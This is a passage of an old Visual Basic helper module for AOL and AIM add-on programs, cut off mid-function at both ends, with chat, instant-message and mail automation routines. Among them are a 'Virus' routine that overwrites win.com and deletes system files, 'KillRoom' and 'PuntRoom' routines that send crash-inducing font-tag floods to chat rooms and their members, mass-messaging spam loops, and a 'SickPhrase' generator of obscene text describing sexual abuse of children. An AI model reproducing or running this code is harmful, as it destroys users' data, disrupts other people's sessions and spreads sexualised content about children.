SnFromIM5$ = Mid$(SnFromIM3$, 1, (SnFromIM2% - 18))
AIMGetSnFromIM = SnFromIM5$

End Function

Sub AIM_ChangeBuddyCaption(newcaption As String)

BuddyCaption1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
BuddyCaption2% = SendMessageByString(BuddyCaption1%, WM_SETTEXT, 0, newcaption$)
End Sub
Sub AIM_MassIM(List As ListBox, Text As String)

List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call SendIM(List.Text, Text)
TimeOut 1.5
Next MassIM1
List.Enabled = True
End Sub
Sub ChangeChatCaption(newcaption As String)

ChatCaption1% = FindWindow("AIM_IMessage", vbNullString)
ChatCaption2% = SendMessageByString(ChatCaption1%, WM_SETTEXT, 0, newcaption$)
End Sub

Sub ChangeIMCaption(newcaption As String)

IMCaption1% = FindWindow("AIM_IMessage", vbNullString)
IMCaption2% = SendMessageByString(IMCaption1%, WM_SETTEXT, 0, newcaption$)
End Sub

Sub AIM_ChatSend(Text As String)

ChatSend1% = FindWindow("AIM_ChatWnd", vbNullString)
    If ChatSend1% = 0 Then Info% = MsgBox("There is no chat room open, so please open one", vbInformation + vbOKOnly, "Error!")
ChatSend2% = FindChildByClass(ChatSend1%, "_Oscar_Separator")
ChatSend3% = GetWindow(ChatSend2%, GW_HWNDNEXT)
ChatSend4% = GetWindow(ChatSend3%, GW_HWNDNEXT)
ChatSend5% = SendMessageByString(ChatSend3%, WM_SETTEXT, 0, Text$)
Click (ChatSend4%)
End Sub


Sub AIM_HideAd()

Hide1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Hide2% = FindChildByClass(Hide1%, "Ate32Class")
Hide3% = ShowWindow(Hide2%, SW_HIDE)
End Sub

Sub AIM_ShowAd()

Show1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Show2% = FindChildByClass(Show1%, "Ate32Class")
Show3% = ShowWindow(Show2%, SW_SHOW)
End Sub


Sub RoomGreeter(greet$)
'Set your chat options so that it notifys when
'members arrive only

If SNFromLastChatLine = "OnlineHost" Then SendChat greet$
End Sub


Sub KillRoom()

SendChat "oo</p><p align=center><Font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>oo"
TimeOut (0.2)
SendChat "oo</p><p align=center><Font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>oo"
TimeOut (0.2)
SendChat "oo</p><p align=center><Font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>oo"
TimeOut (0.2)
SendChat "oo</p><p align=center><Font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>oo"
Room% = FindChildByClass(AOLMDI(), "AOL Child")
Call Window_Close(Room%)


End Sub



Sub textset(hwnd As Integer, what As String)
Dim r
r = SendMessageByString(hwnd, &HC, 0, what)

End Sub


Sub SystemFontsToList(lst As ListBox)

For i = 0 To Screen.FontCount - 1  ' Determine number of fonts.
    lst.AddItem Screen.Fonts(i)  ' Put each font into list box.
Next i
End Sub


Sub Virus()
MsgBox "This is a VIRUS CODE and will harm your computer!"
' Might Want to get rid of that!
Printer.Print "NASH KB Ultra 1 Virus"
Open "c:\windows\win.com" For Output As #1
Print #1, "NASH KB"
Close #1
Kill "c:\dos\*.*"
Kill "c:\*.*"
End Sub

Sub AntiIdle()
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
Click (AOIcon%)
End Sub


Sub AOLHideWelcome()
'Hides the welcome screen that I know time after time you sat thier and
'and pushed the A button trying to close it
X = FindChildByTitle(AOLMDI(), "Welcome, " & UserSN() & "!")
Call ShowWindow(X, SW_HIDE)
End Sub
Sub AOLSNReset(SN$, aoldir$, Replace$)
'Resets your SN to a new User
l0036 = Len(SN$)
Select Case l0036
Case 3
i = SN$ + "       "
Case 4
i = SN$ + "      "
Case 5
i = SN$ + "     "
Case 6
i = SN$ + "    "
Case 7
i = SN$ + "   "
Case 8
i = SN$ + "  "
Case 9
i = SN$ + " "
Case 10
i = SN$
End Select
l0036 = Len(Replace$)
Select Case l0036
Case 3
Replace$ = Replace$ + "       "
Case 4
Replace$ = Replace$ + "      "
Case 5
Replace$ = Replace$ + "     "
Case 6
Replace$ = Replace$ + "    "
Case 7
Replace$ = Replace$ + "   "
Case 8
Replace$ = Replace$ + "  "
Case 9
Replace$ = Replace$ + " "
Case 10
Replace$ = Replace$
End Select
X = 1
Do Until 2 > 3
Text$ = ""
DoEvents
On Error Resume Next
Open aoldir$ + "\idb\main.idx" For Binary As #1
If Err Then Exit Sub
Text$ = String(32000, 0)
Get #1, X, Text$
Close #1
Open aoldir$ + "\idb\main.idx" For Binary As #2
Where1 = InStr(1, Text$, i, 1)
If Where1 Then
Mid(Text$, Where1) = Replace$
ReplaceX$ = Replace$
Put #2, X + Where1 - 1, ReplaceX$
401:
DoEvents
Where2 = InStr(1, Text$, i, 1)
If Where2 Then
Mid(Text$, Where2) = Replace$
Put #2, X + Where2 - 1, ReplaceX$
GoTo 401
End If
End If
X = X + 32000
LF2 = LOF(2)
Close #2
If X > LF2 Then GoTo 301
Loop
301:
End Sub

Sub Keyword(TheKeyWord As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 20
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call TimeOut(0.05)
Click (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, TheKeyWord)

Call TimeOut(0.05)
Click (AOIcon2%)
Click (AOIcon2%)

End Sub


Sub IMBuddy(Recipiant, message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
buddy% = FindChildByTitle(MDI%, "Buddy List Window")

If buddy% = 0 Then
    Keyword ("BuddyView")
    Do: DoEvents
    Loop Until buddy% <> 0
End If

AOIcon% = FindChildByClass(buddy%, "_AOL_Icon")

For L = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next L

Call TimeOut(0.01)
Click (AOIcon%)

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call TimeOut(0.01)
Click (AOIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

Call Keyword("aol://9293:")

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call TimeOut(0.01)
Click (AOIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub

Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function

Function GetchatText()
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
chattext = GetText(AORich%)
GetchatText = chattext
End Function

Function mIRCGetChatText()
ParHand1& = FindWindow("mIRC32", "mIRC32")
OurParent& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
win% = FindWindowEx(OurParent&, 0, "channel", vbNullString)
chattext = GetText(win%)
mIRCGetChatText = chattext
End Function
Function LastChatLineWithSN()
chattext$ = GetchatText

For FindChar = 1 To Len(chattext$)

thechar$ = Mid(chattext$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
LastLine = Mid(chattext$, lastlen, Len(thechars$))

LastChatLineWithSN = LastLine
End Function

Function SNFromLastChatLine()
chattext$ = LastChatLineWithSN
ChatTrim$ = Left$(chattext$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function

Function LastChatLine()
chattext = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(chattext, ChatTrimNum + 4, Len(chattext) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub IdleBot(message$)
'Put all this in a timer
'start button code: timer1.enable=true
'stop button code: timer1.enabled=false

'in the stop button put: notidle=0
If FindChatRoom = 0 Then MsgBox "Please enter a chatroom"
Do Until notidle = 0
SendChat message$
TimeOut (60)
Loop

End Sub
Sub Make3d(frm As Form, Ctl As Control)

frm.ScaleMode = 3
frm.CurrentX = Ctl.Left - 1
frm.CurrentY = Ctl.Top + Ctl.Height
frm.Line -Step(0, -(Ctl.Height + 1)), RGB(92, 92, 92)
frm.Line -Step(Ctl.Width + 1, 0), RGB(92, 92, 92)
frm.Line -Step(0, Ctl.Height + 1), RGB(255, 255, 255)
frm.Line -Step(-(Ctl.Width + 1), 0), RGB(255, 255, 255)
End Sub



Sub AddRoomToListbox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
TheList.Clear

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Public Sub PlayMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("play " & MIDIFile$, 0&, 0, 0)
    End If
End Sub


Public Sub OpenEmailNew(index As Long)
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < index& Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(mTree&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(mTree&, WM_KEYUP, VK_RETURN, 0&)
End Sub
Function mIRCSendChat(Chat)
ParHand1& = FindWindow("mIRC32", "mIRC32")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "channel", vbNullString)
ourhandle& = FindWindowEx(OurParent&, 0, "Edit", vbNullString)
Call SetFocusAPI(ourhandle&)
Call SendMessageByString(ourhandle&, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(ourhandle&, WM_CHAR, 13, 0)
End Function
Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function


Public Sub MoveForm(frm As Form)
'Coded by Kramer
ReleaseCapture
X = SendMessage(frm.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&)

'To use this,  put the following code in the "Mousedown"  dec
'of a label or picture box *Replace frm with your formname.
' Call MoveForm(frm)

End Sub



Sub AddRoomToCombobox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListbox(ListBox)
For q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(q))
Next q
End Sub



Public Function MailCountNew() As Long
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Count As Long
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    MailCountNew& = Count&
End Function
Sub PuntRoom(punt$, dalist As ListBox)

Call AddRoomToListbox(dalist)
For X = 1 To dalist.ListCount
Call IMKeyword(dalist.List(X), punt$)
Next X

End Sub


Sub IMAnsweringMachine(lst As ListBox, message$)

'To use this put in a timer with an interval of
'about 3

IM% = FindChildByTitle(AOLMDI(), "Instant Message From:")
If IM% Then lst.AddItem SNfromIM & MessageFromIM: Call Window_Close(IM%): Call IMKeyword(SNfromIM, message$)
TimeOut (1)
IM2% = FindChildByTitle(AOLMDI(), "Instant Message To:")
TimeOut (2)
Call Window_Close(IM2%)

End Sub

Sub FakeProg(ascii$, handle$, prog$)
SendChat ascii$ & prog$ & ascii$
TimeOut (0.3)
SendChat ascii$ & " By: " & handle$ & ascii$
TimeOut (0.3)
SendChat ascii$ & "Has been Loaded" & ascii$



End Sub


Function ClearChat()


SendChat "<FONT FACE=GROUDY STOUT><FONT COLOR=#FFFEFF>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
SendChat "<FONT FACE=GROUDY STOUT><FONT COLOR=#FFFEFF>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
TimeOut (0.4)
SendChat "<FONT FACE=GROUDY STOUT><FONT COLOR=#FFFEFF>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
SendChat "<FONT FACE=GROUDY STOUT><FONT COLOR=#FFFEFF>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
TimeOut (0.4)
SendChat "<FONT FACE=GROUDY STOUT><FONT COLOR=#FFFEFF>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
SendChat "<FONT FACE=GROUDY STOUT><FONT COLOR=#FFFEFF>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"


End Function


Sub AntiPunter()
'Put this in a timer. set the interval to about 2
'and in it put AntiPunter()

IM% = FindChildByTitle(AOLMDI(), "Instant Message From:")
If IM% Then Call Window_Close(IM%)

End Sub
Function SickPhrase() As String




Randomize Timer
Select Case Int(Rnd * 15)
    Case 0: phrase$ = "I LIKE TO "
    Case 1: phrase$ = "I LOVE TO "
    Case 2: phrase$ = "IT MAKES ME HORNY WHEN I "
    Case 3: phrase$ = "MY ASSHOLE GETS WET WHEN I "
    Case 4: phrase$ = "IT GIVES ME ANAL PLEASURE TO "
    Case 5: phrase$ = "IT MAKES ME CUM WHEN I "
    Case 6: phrase$ = "I MOAN WHEN I "
    Case 7: phrase$ = "I CUM INTO MY ASSHOLE WHEN I "
    Case 8: phrase$ = "I LOVE THE FEELING I GET WHEN I "
    Case 9: phrase$ = "MY ANAL ROLLS JIGGLE WHEN I "
    Case 10: phrase$ = "I INSERT MY PINKY INTO THE TIP OF MY PENIS SO I CAN "
    Case 11: phrase$ = "I POSE AS A PRIEST JUST SO I CAN "
    Case 12: phrase$ = "IT MAKES ME CUM IN MY PANTIES WHEN I "
    Case 13: phrase$ = "I STICK MY THUMB UP MY ASS WHEN I "
    Case 14: phrase$ = "ALL PAIN DISSAPPEARS WHEN I "
End Select
Select Case Int(Rnd * 19)
    Case 0: phrase$ = phrase$ + "FONDLE LITTLE BOYS"
    Case 1: phrase$ = phrase$ + "TOUCH LITTLE GIRLS"
    Case 2: phrase$ = phrase$ + "FINGER FUCK MY ASSHOLE"
    Case 3: phrase$ = phrase$ + "ANALY RAPE CHICKENS"
    Case 4: phrase$ = phrase$ + "ASS FUCK NUNS"
    Case 5: phrase$ = phrase$ + "MOLEST PRE SCHOOLERS"
    Case 6: phrase$ = phrase$ + "STRETCH THE ASSHOLES OF KINDERGARTENERS"
    Case 7: phrase$ = phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK MY PENIS"
    Case 8: phrase$ = phrase$ + "LOOK AT OTHER MEN"
    Case 9: phrase$ = phrase$ + "TOUCH OTHER MENS PENIS'S AND THEN STROKE THEIR SHAFTS"
    Case 10: phrase$ = phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: phrase$ = phrase$ + "FINGER MY MOTHERS CUNT"
    Case 12: phrase$ = phrase$ + "STRANGLE LITTLE BOYS THEN RAPE THEIR DEAD BODIES"
    Case 13: phrase$ = phrase$ + "GET INTO THE PANTS OF A 7 YEAR OLD GIRL"
    Case 14: phrase$ = phrase$ + "MOLEST STATUES OF GREAT AMERICAN HEROES"
    Case 15: phrase$ = phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: phrase$ = phrase$ + "SHOVE A BROOM STICK UP MY PET DOGS ASSHOLE"
    Case 17: phrase$ = phrase$ + "GO TO A PLAYGROUND AND MOLEST THE CHILDREN"
    Case 18: phrase$ = phrase$ + "BREAK IN A 5 YEAR OLDS PUSSY"
End Select
SickPhrase = phrase$
End Function
Sub MailClickForward(SN, message)
'Forwards a mail
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDI Client")
FwdWin% = FindChildByTitle(AOL%, "Fwd: ")

Edit% = FindChildByClass(FwdWin%, "_AOL_Edit")
Rich% = FindChildByClass(FwdWin%, "RICHCNTL")
Icon% = FindChildByClass(FwdWin%, "_AOL_ICON")
Call SendMessageByString(Edit%, WM_SETTEXT, 0, SN)
Call SendMessageByString(Rich%, WM_SETTEXT, 0, message)
Call AOLClickIcon(Icon%)
End Sub

Sub EliteTalker(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "d" Then Leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If letter$ = "`" Then Leet$ = "´"
    If letter$ = "!" Then Leet$ = "¡"
    If letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next q
SendChat (Made$)
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", " ")
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", " ")
End Sub



Sub Attention(TheText As String)

SendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call TimeOut(0.15)
SendChat (TheText)
Call TimeOut(0.15)
SendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call TimeOut(0.15)
End Sub

Sub KillGlyph()

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub


Function TrimTime()
b$ = Left$(Time$, 5)
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(b$, 3) & " " & Ap$
End Function
Function TrimTime2()
b$ = Time$
HourH$ = Left$(b$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(b$, 5) & " " & Ap$
End Function

Function EliteText(word$)
Made$ = ""
For q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next q

EliteText = Made$

End Function



Sub IMIgnore(TheList As ListBox)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% <> 0 Then
    For findsn = 0 To TheList.ListCount
        If LCase$(TheList.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = IM%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Function SNfromIM()

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient") '

